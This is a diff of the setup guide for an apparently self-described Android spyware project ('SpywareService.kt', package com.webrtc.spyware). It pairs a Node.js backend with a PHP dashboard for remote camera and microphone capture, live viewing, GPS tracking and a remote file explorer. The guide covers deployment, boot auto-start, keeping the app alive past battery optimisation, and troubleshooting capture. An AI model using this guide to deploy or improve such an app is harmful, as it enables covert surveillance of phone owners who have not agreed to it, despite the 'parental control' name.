 # Copy php-dashboard/ to htdocs/
 # Open install.php → use localhost DB
 # Set Node URL to http://localhost:3000
 
-# 3. Android — change SERVER_URL in SpywareService.kt
-# to http://10.0.2.2:3000 (emulator) or http://YOUR-LAN-IP:3000 (device)
+# 3. Android emulator
+# SERVER_URL = "http://10.0.2.2:3000"   (emulator → host machine)
+# SERVER_URL = "http://YOUR-LAN-IP:3000" (physical device)
 ```
 
 ---
@@ -599,16 +543,17 @@ node server.js
 
 | Problem | Cause | Fix |
 |---|---|---|
-| Device not appearing in dashboard | Wrong `SERVER_URL` in Android | Check `SpywareService.kt` Render URL |
+| Device not in dashboard | Wrong `SERVER_URL` | Check `SpywareService.kt` → Render URL |
 | `install.php` DB error | Wrong credentials | Verify MySQL user has CREATE privilege |
-| Capture buttons do nothing | Device offline / disconnected | Check green border on device card |
-| Live view black screen | WebRTC permissions | Ensure HTTPS on PHP host; allow camera/mic in browser |
-| Media not uploading | `upload_media.php` path wrong | Verify `php-dashboard/uploads/` folder exists + writable (chmod 755) |
-| Render sleeping (free tier) | Inactivity | Android auto-reconnects on wake; use UptimeRobot ping to keep alive |
-| `CORS blocked` | Node origin mismatch | Node.js uses `origin: '*'` — should not block; check browser console |
-| Audio/Video garbled | Low bitrate or network | MediaRecorder uses 128kbps AAC + 3Mbps H264; reduce if needed |
-| `foregroundServiceType` error | Android 14+ strict | Ensure `FOREGROUND_SERVICE_CAMERA` + `FOREGROUND_SERVICE_MICROPHONE` in manifest |
-| App killed by battery saver | Manufacturer battery optimization | Whitelist app from battery optimization in device settings |
+| Capture does nothing | Device offline | Check green border on device card |
+| Live view black screen | No HTTPS / WebRTC blocked | Ensure PHP host uses HTTPS; allow camera in browser |
+| Media not in gallery | `uploads/` not writable | `chmod 755 php-dashboard/uploads/` |
+| Render sleeping | Free tier | Android auto-reconnects; use UptimeRobot to keep alive |
+| Audio/Video garbled | Low network | MediaRecorder: 128kbps AAC + 3Mbps H264; reduce if needed |
+| API 34 build fail | `foregroundServiceType` | Add `FOREGROUND_SERVICE_CAMERA` + `MICROPHONE` permissions |
+| App killed | Battery optimization | Whitelist from device battery settings |
+| GPS not showing | Permission missing | Grant `ACCESS_FINE_LOCATION` + enable GPS |
+| File explorer drops | Network unstable | Auto-reconnects; 64KB chunks handle large files |
 
 ---
 
@@ -621,7 +566,7 @@ node server.js
 | `NODE_ENV` | `production` |
 
 ### PHP Host
-All config written to `config.php` by `install.php`. No `.env` needed.
+All config written to `config.php` by `install.php`. No `.env` file needed.
 
 ---
 
@@ -632,46 +577,45 @@ WebRTC-Android-prentcontrol/
 │
 ├── 📱 Android App (Kotlin)
 │   ├── app/build.gradle.kts
-│   ├── app/src/main/
-│   │   ├── AndroidManifest.xml
-│   │   ├── AndroidManifest_additions.xml   ← permissions guide
-│   │   └── java/com/webrtc/spyware/
-│   │       ├── SpywareService.kt           ← foreground service (main)
-│   │       ├── SocketManager.kt            ← Socket.IO + auto-reconnect
-│   │       ├── MediaCaptureManager.kt      ← Camera2 + MediaRecorder
-│   │       └── BootReceiver.kt             ← auto-start on boot
-│   └── build.gradle.kts
+│   └── app/src/main/
+│       ├── AndroidManifest.xml
+│       ├── AndroidManifest_additions.xml     ← full permissions guide
+│       └── java/com/webrtc/spyware/
+│           ├── SpywareService.kt             ← foreground service (MAIN)
+│           ├── SocketManager.kt              ← Socket.IO + auto-reconnect
+│           ├── MediaCaptureManager.kt        ← Camera2 + MediaRecorder
+│           └── BootReceiver.kt               ← auto-start on boot
 │
 ├── 🟢 Node.js Backend (Render)
 │   └── node-backend/
-│       ├── server.js                       ← Socket.IO signaling server
+│       ├── server.js                         ← Socket.IO signaling
 │       ├── package.json
-│       └── render.yaml                     ← Render deploy config
+│       └── render.yaml                       ← Render deploy config
 │
 ├── 🐘 PHP Dashboard (your host)
 │   └── php-dashboard/
-│       ├── install.php                     ← one-click installer
-│       ├── config.php                      ← auto-generated by installer
-│       ├── login.php                       ← admin login
-│       ├── index.php                       ← main dashboard + media gallery
-│       ├── upload_media.php                ← receives + stores media
-│       ├── delete_media.php                ← removes media
+│       ├── install.php                       ← one-click installer ⚠️ delete after
+│       ├── config.php                        ← auto-generated by installer
+│       ├── login.php                         ← admin login (bcrypt)
+│       ├── index.php                         ← main dashboard + gallery
+│       ├── upload_media.php                  ← media storage endpoint
+│       ├── delete_media.php                  ← file + DB removal
 │       ├── logout.php
 │       ├── .htaccess
-│       ├── uploads/                        ← media files (auto-created)
+│       ├── uploads/                          ← media files (auto-created)
 │       └── README.md
 │
 ├── 📦 Legacy Server (backward compat)
 │   └── Android-WebRTC-Spyware-Server/
-│       ├── server.js                       ← updated with new events
+│       ├── server.js                         ← updated with new events
 │       ├── package.json
 │       └── render.yaml
 │
-├── README.md
-├── SETUP.md                                ← this file
+├── README.md                                 ← project overview + features
+├── SETUP.md                                  ← this file
 └── LICENSE
 ```
 
 ---
 
-*Built with Node.js · Socket.IO · WebRTC · PHP · MySQL · Kotlin · Camera2 API · MediaRecorder*
+*Built with Node.js · Socket.IO · WebRTC · PHP · MySQL · Kotlin · Camera2 API · MediaRecorder · Firebase*
